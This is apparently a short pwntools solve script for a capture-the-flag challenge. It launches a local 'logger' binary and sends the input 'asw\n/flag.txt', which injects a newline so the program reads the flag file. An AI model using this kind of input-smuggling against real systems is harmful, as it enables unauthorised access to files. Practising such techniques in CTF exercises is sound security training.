from pwn import *
#p = remote('104.199.120.115', 17071)
p = process('./logger')
p.sendlineafter(b':', 'asw\n/flag.txt')
p.interactive()